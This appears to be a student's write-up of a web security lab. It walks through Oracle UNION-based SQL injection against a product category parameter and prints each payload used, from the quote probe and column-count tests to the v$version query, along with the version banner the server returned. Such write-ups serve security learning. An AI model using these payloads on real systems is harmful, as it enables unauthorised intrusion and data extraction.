# **Oracle SQL Injection – Extracting Database Type & Version (UNION‑Based Enumeration)**

---

## 📌 **1. Observation**

- The vulnerable parameter was located in the **category** field of a product listing endpoint.
- Supplying a normal category value loaded items as expected.
- Injecting a **single quote (' )** triggered an **Internal Server Error**:
    - This is a strong indicator that the input is inserted inside a SQL string literal.
- This behavior suggested:
    - User input is directly concatenated into an SQL query.
    - The application does not sanitize or parameterize the category value.

---

## 🧠 **2. Hypothesis**

The backend query likely resembles something like:

```sql
SELECT * FROM products
WHERE category = '<user_input>';
```

Reasoning:

- A single quote breaks the query
- To extract database details, a **UNION-based injection** can be used.
- Tried to get data with but didn't worked , then used SQL cheat sheet from Portwiggers and oracle syntax worked, that indicated underlying DB is oracle.

Because Oracle requires a FROM clause when selecting static data, the payload must use:

```sql
FROM dual
```

**Hypothesis:**

If we identify the correct number of columns and at least one column accepting text, we can inject:

```sql
UNION SELECT banner, NULL FROM v$version--
```

…to retrieve Oracle version information.

---

## 🧪 **3. Test (Experiments Conducted)**

### **Test 1 — Injection Detection**

- **Input:** `'`
- **Actual:** Internal Server Error
- **Interpretation:** Confirmed SQL injection vulnerability; Oracle syntax break.

---

### **Test 2 — Column Count Discovery**

Tried successive payloads:

```sql
' UNION SELECT NULL FROM dual--
```

→ Error

```sql
' UNION SELECT NULL, NULL FROM dual--

```

→ Page loaded successfully

**Interpretation:** Query expects **2 columns**.

---

### **Test 3 — Datatype Identification**

Tested string acceptance:

```sql
Gifts' UNION SELECT 'a','b' FROM dual--
```

- **Actual:** Page rendered correctly
- **Interpretation:**
    - Both columns accept **text data**
    - UNION-based extraction can proceed with string-returning system views.

---

### **Test 4 — Version Extraction Attempt**

Payload used:

```sql
' UNION SELECT banner, NULL FROM v$version--
```

- **Actual:** Page displayed version information.
- **Interpretation:** Successfully enumerated Oracle DB type & version.

---

## 📊 **4. Result**

### ✔ **Payload Used**

```sql
' UNION SELECT banner, NULL FROM v$version--
```

### ✔ **Extracted Information**

The server returned:

```
CORE 11.2.0.2.0 Production
NLSRTL Version 11.2.0.2.0 - Production
Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production
PL/SQL Release 11.2.0.2.0 - Production
TNS for Linux: Version 11.2.0.2.0 - Production

```

### ✔ **Proof of Lab Completion**

- Version banners displayed directly in the application response.
- This confirmed:
    - DBMS is **Oracle 11g**
    - UNION-based SQL injection fully exploitable.
- Screenshot

<img width="1185" height="653" alt="image" src="https://github.com/user-attachments/assets/7061f899-0196-4fa5-ae68-ea13c5c3a29b" />


---

## 🎓 **5. Learning (Deep Reasoning)**

- Oracle **requires strict column count & datatype matching**; understanding this is essential for crafting valid payloads.
- Oracle queries cannot `SELECT 'a', 'b'` without a table, hence the need for `FROM dual`.
- `v$version` is one of Oracle’s most informative metadata views for version extraction.
- Column count discovery is the foundational step in UNION SQLi:
    - Too few columns → syntax error
    - Too many columns → syntax error
    - Wrong types → datatype error
- Learning to distinguish these Oracle error patterns is key to fast exploitation and enumeration.

---

## 🔮 **6. Future Pattern Detection**

Similar behavior indicates high chance of Oracle SQL injection:

- `'` produces an **Internal Server Error** instead of safe handling.
- Application echoes metadata or behaves differently depending on column type.
- UNION SELECT requires `FROM dual`.
- Presence of Oracle‑specific backend quirks (case sensitivity, datatype strictness).

These patterns help predict Oracle backend + SQLi before payloading.

---

## 🧭 **7. Notes for My Future Self**

- Always test `'` → quickest SQLi detector.
- Oracle needs **dual** for static selects.
- `v$version` is the fastest path for version enumeration.
- Column count discovery is mandatory before any Oracle UNION injection.
- Datatype mismatches are your biggest Oracle enemy; probe carefully.
